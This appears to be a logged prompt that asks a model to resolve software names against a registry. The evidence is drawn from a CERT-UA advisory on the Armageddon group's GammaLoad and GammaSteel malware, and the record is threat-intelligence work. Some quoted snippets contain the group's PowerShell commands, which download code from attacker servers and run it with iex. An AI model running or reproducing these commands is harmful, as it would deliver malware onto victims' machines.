=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1, GammaLoad.PS1_v2]
E2. TRYxaEbX.ps1
E3. z.ps1
E4. stage1.ps1
E5. OUTSTEEL
E6. stage2.ps1
E7. TRYxaEbX_2.ps1
E8. GraphSteel
E9. SSH
E10. csrss.exe
E11. .NET Framework
E12. ConfuserEx
E13. RelicRace
E14. python-requests
E15. MarsStealer
E16. GandCrab v4
E17. FTPGetter
E18. JesterStealer
E19. Hashcat
E20. CADDYWIPER
E21. needrestart
E22. Meterpreter
E23. write.exe
E24. PowerShell [aka powershell.exe]
E25. 223329.exe
E26. POWERGAP
E27. 62ea.exe
E28. SPECTR.Shell
E29. wscript.exe
E30. 966449.exe
E31. MS PowerPoint
E32. GammaSteel.NET
E33. HarvesterX
E34. PowerShell (powershell.exe)
E35. GammaSteel.PS1
E36. kopratiso.ru
E37. acteran.ru
E38. bilitora.ru
E39. fishitor.ru
E40. apoxipodes.ru
E41. dodortar.ru
E42. tiloraso.ru
E43. a0322810.xsph.ru
E44. billyhot.ru
E45. dod-upload.dodortar.ru
E46. tortunas.ru
E47. candidar.ru
E48. lnk-upload.dodortar.ru
E49. motocheck.in
E50. stormpredictor.host
E51. meteolink.host
E52. successilin.top
E53. xsph.ru
E54. erwini.ru
E55. mulleti.ru
E56. bul-opros.top
E57. iol.pt
E58. toknowall.com
E59. gopoppers.com
E60. podologaneri.it
E61. co-opros.top
E62. nitikora.ru
E63. districoperav.icu
E64. potrakit.ru
E65. giraffe-tour.ru
E66. rivierafamily.com
E67. tridiuma.ru
E68. yandex.ru
E69. varanasiclick.ru
E70. olei.ro
E71. jevejosader.top
E72. enlamentedeunasesor.com
E73. milotrad.ru
E74. milotraf.ru
E75. s8.h.mchost.ru
E76. aspe.ro
E77. omyce.ru
E78. pastebin.com
E79. leonardis.ru
E80. jokotras.ru
E81. afi-opros.top
E82. nikotod.ru
E83. mitraseo.hol.es
E84. parodadoca.ru
E85. marmaris.com.ua
E86. nx0.ru
E87. ncscc.gov.ua
E88. rmssrv4.ru
E89. www.msftncsi.com
E90. rmssrv2.ru
E91. tas-gos.top
E92. staystrongjewels.com
E93. wi-opros.top
E94. xcasinobonuses.net
E95. viewdns.net
E96. servebeer.com
E97. evil.server.com
E98. 3utilities.com
E99. gotdns.ch
E100. agreminj.com
E101. whoer.net
E102. airmauritiusticket.com
E103. cloudflare-dns.com
E104. sytes.net
E105. bounceme.net
E106. ddns.net
E107. plexbd.net
E108. brunoboys.net
E109. netbin.host
E110. dcshost.net
E111. domthr.xyz
E112. d-upl.ddns.net
E113. gov-ua.info
E114. ns.ns2-dns.com
E115. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E116. dyndns.com
E117. ns.ns3-dns.com
E118. freedynamicdns.net
E119. arentuk.com
E120. www.facebook.com
E121. winchconstruction.com
E122. www.michiganmastereltiempo.com
E123. www.symantec.com
E124. kohhd.com
E125. fluoxi.com
E126. atlantar.ru
E127. motoristo.ru
E128. moolin.ru
E129. bubenci.ru
E130. callsol.ru
E131. clipperso.ru
E132. cooperi.ru
E133. detroito.ru
E134. farafauler.ru
E135. flayga.ru
E136. ganara.ru
E137. hawksi.ru
E138. hofsteder.ru
E139. kilitro.ru
E140. kurapat.ru
E141. lnasfe.ru
E142. lopasts.ru
E143. mafirti.ru
E144. metanat.ru
E145. mitlubald.ru
E146. paparat.ru
E147. pasamart.ru
E148. qkcew.ru
E149. rncsq.ru
E150. tarlit.ru
E151. tbwelo.ru
E152. wicksl.ru
E153. xcqef.ru
E154. nxkad.ru
E155. dnslookup.seowebchecker.com
E156. tools.nexcess.net
E157. viewdns.info
E158. www.portcheckers.com
E159. lover.printing82.detroito.ru
Mentions:
M1. "GammaSteel.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "GammaSteel.NET" (Software) — options: E9, E11, E1, E12 — ctx: S1
M3. "HarvesterX" (Software) — options: E9, E17, E18, E12 — ctx: S1
